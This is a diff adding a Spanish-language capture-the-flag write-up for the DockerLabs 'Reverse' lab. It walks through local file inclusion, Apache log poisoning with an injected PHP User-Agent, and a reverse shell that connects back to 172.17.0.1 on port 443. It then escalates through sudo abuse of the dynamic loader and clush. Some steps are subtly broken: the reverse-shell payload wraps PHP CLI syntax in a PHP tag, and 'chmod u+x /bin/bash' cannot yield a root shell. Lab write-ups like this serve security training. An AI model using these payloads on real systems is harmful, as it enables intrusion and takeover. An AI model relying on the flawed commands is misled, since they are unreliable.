@@ -1,0 +1,222 @@
+---
+title: Reverse
+description: Resolución completa de la máquina virtual *Reverse* de DockerLabs, incluyendo reconocimiento, explotación y escalada de privilegios.
+---
+
+import InfoTable from 'src/components/InfoTable.astro';
+import VulnTable from 'src/components/VulnTable.astro';
+
+## Introducción
+
+Este documento presenta la resolución completa de la máquina **Reverse**, desarrollada por *maciiii___* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
+El laboratorio expone un servidor web con un archivo JavaScript que revela un directorio oculto tras 20 clics. Dentro del directorio se encuentra un binario que, tras ser decompilado con Ghidra, revela una contraseña que lleva a un dominio interno. En este dominio, se encuentra un parámetro vulnerable a **Local File Inclusion (LFI)**, utilizado para leer logs de Apache y ejecutar código mediante **Log Poisoning**, obteniendo acceso como `www-data`.
+Una vez dentro, se utilizan credenciales extraídas con fuerza bruta local para acceder a `nova`, luego se abusa del loader dinámico para moverse a `maci`, y finalmente se explota `clush` con sudo para obtener acceso completo como `root`.
+Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.
+
+---
+
+## Información Técnica
+
+<InfoTable
+  title=""
+  data={{
+    Nombre: 'Reverse',
+    Autor: 'maciiii___',
+    Dificultad: 'Media',
+    Fecha: '23/06/2024',
+    Plataforma: 'DockerLabs',
+    'IP Objetivo': '172.17.0.2'
+  }}
+/>
+
+---
+
+## Paso 0 — Despliegue y preparación
+
+Se descomprime la máquina y se despliega utilizando el script proporcionado:
+
+```bash
+unzip Reverse.zip
+sudo bash auto_deploy.sh Reverse.tar
+```
+
+Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.
+
+![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)
+
+Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:
+
+```bash
+mkdir -p Reverse/{content,exploits,nmap,scripts}
+cd Reverse
+```
+
+---
+
+## Paso 1 — Reconocimiento
+
+### 1.1 Escaneo de puertos
+
+Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:
+
+```bash
+nmap -p- --open -sS --min-rate 5000 -vvv -n 172.17.0.2 -oG allPorts
+extractPorts allPorts
+```
+
+El resultado muestra los siguientes servicios accesibles externamente:
+
+* **80/tcp** — HTTP
+
+![Puertos abiertos](https://res.cloudinary.com/dewqswzke/image/upload/v1764533605/Ports_iisql0.png)
+
+---
+
+### 1.2 Enumeración de servicios
+
+Se realiza un escaneo detallado de los servicios identificados:
+
+```bash
+nmap -sCV -p80 172.17.0.2
+```
+
+---
+
+### 1.3 Enumeración web
+
+Se realiza un escaneo de directorios:
+
+```bash
+feroxbuster -u http://172.17.0.2 -d 0 \
+  -w /usr/share/seclists/Discovery/Web-Content/DirectoryList2.3-medium.txt \
+  -x php,txt,html,js,bak,old \
+  -t 40 -C 404,403
+```
+
+![Feroxbuster](https://res.cloudinary.com/dewqswzke/image/upload/v1764533603/Feroxbuster_ntjlrj.png)
+
+**Rutas relevantes:**
+- `/js/script.js` — Archivo JavaScript que revela un directorio oculto tras 20 clics.
+
+![Script.js](https://res.cloudinary.com/dewqswzke/image/upload/v1764533607/Script.js_o03orh.png)
+
+---
+
+## Paso 2 — Explotación (Acceso inicial)
+
+### 2.1 Binario secreto
+
+En el directorio `secret_dir` se encuentra un binario que pide una contraseña. Se decompila con Ghidra y se identifica la contraseña correcta:
+
+![Ghidra](https://res.cloudinary.com/dewqswzke/image/upload/v1764533603/Ghidra_ihneqi.png)
+
+Al ejecutar el binario, se obtiene un mensaje en Base64 que decodificado revela un dominio interno:
+
+![Secret](https://res.cloudinary.com/dewqswzke/image/upload/v1764533607/Secret_ithnyi.png)
+
+Se agrega al `/etc/hosts`.
+
+### 2.2 Local File Inclusion
+
+Se encuentra el parámetro `module` vulnerable a LFI:
+
+```
+http://<DOMAIN>/experiments.php?module=./modules/default.php
+```
+
+Se lee `/etc/passwd`:
+
+![Passwd](https://res.cloudinary.com/dewqswzke/image/upload/v1764533604/Passwd_hxiz4v.png)
+
+Usuarios: `maci`, `nova`.
+
+### 2.3 Log Poisoning
+
+Se inyecta PHP en el User-Agent del log de Apache:
+
+```bash
+curl -s -X GET http://<DOMAIN>/ -A '<?php system("id") ?>'
+```
+
+![Webshell](https://res.cloudinary.com/dewqswzke/image/upload/v1764533609/WebShell_ed6n8y.png)
+
+### 2.4 Reverse shell
+
+Se inicia un listener:
+
+```bash
+nc -nlvp 443
+```
+
+Se ejecuta el payload:
+
+```bash
+curl http://172.17.0.2 -A "<?php -r '$sock=fsockopen(\"172.17.0.1\",443);exec(\"sh <&3 >&3 2>&3\");' ?>"
+```
+
+![Reverse shell](https://res.cloudinary.com/dewqswzke/image/upload/v1764533606/Reverse_wo6aff.png)
+
+---
+
+## Paso 3 — Escalada de privilegios
+
+### 3.1 De www-data → nova
+
+```bash
+sudo -u nova ./opt/password_nova
+```
+
+![Pista](https://res.cloudinary.com/dewqswzke/image/upload/v1764533604/Pista_ilfeot.png)
+
+Se utiliza `UserRush` para obtener la contraseña:
+
+```bash
+su nova
+```
+
+![Nova](https://res.cloudinary.com/dewqswzke/image/upload/v1764533604/Nova_xvp4hs.png)
+
+### 3.2 De nova → maci
+
+```bash
+sudo -u maci /lib64/ld-linux-x86-64.so.2 /bin/bash
+```
+
+![Maci](https://res.cloudinary.com/dewqswzke/image/upload/v1764533604/Maci_sen6e6.png)
+
+### 3.3 De maci → root
+
+```bash
+sudo /usr/bin/clush -w node[40-42] -b
+!chmod u+x /bin/bash
+bash -p
+```
+
+![Root](https://res.cloudinary.com/dewqswzke/image/upload/v1764533606/root_i5vqrd.png)
+
+---
+
+## Análisis de Vulnerabilidades
+
+### Fallos de Seguridad Identificados
+
+<VulnTable
+  title=""
+  data={[
+    {
+      vulnerability: "Local File Inclusion sin validación",
+      severity: "Crítica",
+      impact: "Lectura de archivos y Log Poisoning"
+    },
+    {
+      vulnerability: "Log Poisoning en Apache",
+      severity: "Crítica",
+      impact: "Ejecución remota de comandos como www-data"
+    },
+    {
+      vulnerability: "Múltiples configuraciones inseguras de sudo",
+      severity: "Crítica",
+      impact: "Escalada progresiva de privilegios a root"
+    }
+  ]}
+/>
